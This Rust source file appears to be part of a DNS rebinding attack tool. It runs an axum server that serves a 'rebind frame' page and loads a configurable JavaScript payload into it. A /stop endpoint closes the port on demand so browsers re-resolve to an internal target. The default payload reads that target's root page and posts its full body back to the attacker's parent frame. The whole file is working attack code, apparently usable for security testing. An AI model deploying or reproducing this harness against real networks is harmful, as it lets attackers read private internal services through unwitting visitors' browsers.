pub async fn serve_standard(bind: &str, active: Active) -> Result<(), Box<dyn std::error::Error>> {
    let state = Arc::new(AppState {
        notify: Notify::new(),
        seconds: AtomicU64::new(DEFAULT_STOP_SECONDS),
        active,
    });

    loop {
        let listener = match bind_listener(bind).await {
            Ok(l) => l,
            Err(e) => {
                tracing::warn!("bind {bind} failed: {e}; retrying in 1s");
                tokio::time::sleep(Duration::from_secs(1)).await;
                continue;
            }
        };

        let app = Router::new()
            .route("/stop", get(stop_handler))
            .fallback(get(frame_page))
            .layer(from_fn(allow_framing))
            .with_state(state.clone());

        tracing::info!("standard listening on http://{bind} (control: GET /stop[?seconds=N])");

        let shutdown_state = state.clone();
        axum::serve(listener, app)
            .with_graceful_shutdown(async move {
                shutdown_state.notify.notified().await;
            })
            .await?;

        let secs = state.seconds.load(Ordering::SeqCst);
        tracing::info!("standard paused; port {bind} closed for {secs}s");
        tokio::time::sleep(Duration::from_secs(secs)).await;
        tracing::info!("standard resuming");
    }
}

async fn stop_handler(
    State(state): State<Arc<AppState>>,
    Query(params): Query<HashMap<String, String>>,
) -> Json<serde_json::Value> {
    let secs = params
        .get("seconds")
        .and_then(|s| s.parse::<u64>().ok())
        .unwrap_or(DEFAULT_STOP_SECONDS)
        .min(MAX_STOP_SECONDS);

    state.seconds.store(secs, Ordering::SeqCst);
    state.notify.notify_one();
    tracing::info!("/stop -> pausing for {secs}s");

    Json(json!({ "status": "stopping", "seconds": secs }))
}

async fn frame_page(State(state): State<Arc<AppState>>) -> Html<String> {
    let payload = state.active.read().unwrap().payload.clone();
    Html(render_frame(&payload))
}

/// Built-in fallback payload, used when no payload file is configured/readable.
/// It reads the rebound target's root and reports status, length and the full
/// body. Configure your own via `REBIND_PAYLOAD_FILE` (see `payload.js`).
pub const DEFAULT_PAYLOAD: &str = r#"// Default placeholder payload.
async function runPayload(rebind) {
  const res = await fetch("/", { cache: "no-store" });
  const body = await res.text();
  rebind.report({ status: res.status, length: body.length, body });
}
"#;

/// Render the rebind frame: a fixed harness that answers `ping` with `pong` and,
/// on `execute`, invokes the configured `runPayload(rebind)`. The harness hands
/// the payload a `rebind` helper:
///   * `rebind.host`         — the current origin hostname
///   * `rebind.report(data)` — send a `result` (with arbitrary `data`) to master
///   * `rebind.error(err)`   — send an `error` to master
/// The payload may be sync or async; thrown/rejected errors are reported.
fn render_frame(payload_js: &str) -> String {
    format!(
        r#"<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>rebind :: frame</title></head>
<body>
<p>rebind frame</p>
<script>
const rebind = {{
  host: location.hostname,
  report: (data) => parent.postMessage(
    {{ type: "result", host: location.hostname, data }}, "*"),
  error: (err) => parent.postMessage(
    {{ type: "error", host: location.hostname, error: String(err) }}, "*"),
}};

window.addEventListener("message", (e) => {{
  const d = e.data || {{}};
  if (d.type === "ping") {{
    parent.postMessage(
      {{ type: "pong", nonce: d.nonce, id: d.id, host: location.hostname }}, "*");
  }} else if (d.type === "execute") {{
    try {{
      Promise.resolve(runPayload(rebind)).catch((err) => rebind.error(err));
    }} catch (err) {{
      rebind.error(err);
    }}
  }}
}});

// ===== configured payload (active project) =====
{payload_js}
</script>
</body>
</html>
"#,
        payload_js = payload_js,
    )
}
